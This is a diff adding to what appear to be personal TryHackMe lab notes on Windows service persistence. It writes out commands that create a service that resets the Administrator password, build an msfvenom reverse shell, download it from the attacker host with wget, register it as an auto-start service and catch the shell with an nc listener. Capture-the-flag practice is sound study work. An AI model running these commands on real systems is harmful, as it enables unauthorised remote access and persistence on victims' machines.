@@ -119,6 +119,19 @@ sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
 sc.exe start THMservice
 -create a reverse shell with msfvenom and associate it with the created service
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attack IP] LPORT=[attack port] -f exe-service -o rev-svc.exe
+-attack machine
+python3 -m http.server
+-victim machine
+wget http://[attackIP]:8000/rev-svc.exe
+-set bin path and service
+sc.exe create THMservice2 binPath= "C:\..\rev-svc.exe" start= auto
+-start listner
+nc -lvp [attack port]
+-start service
+sc.exe start THMservice2
+-grab flag
+*THM{SUSPICIOUS_SERVICE}
+
 
 
 
